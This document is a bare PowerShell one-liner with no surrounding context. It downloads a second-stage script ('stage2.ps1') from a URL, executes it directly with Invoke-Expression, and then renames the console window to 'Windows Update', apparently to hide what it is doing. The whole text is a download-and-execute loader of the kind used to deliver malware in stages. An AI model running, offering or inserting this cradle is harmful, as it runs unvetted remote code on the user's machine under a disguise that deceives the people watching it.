
$Stage1Url = 'https://internal.corp/stage2.ps1'; Invoke-Expression (New-Object System.Net.WebClient).DownloadString($Stage1Url); $Host.UI.RawUI.WindowTitle = "Windows Update"
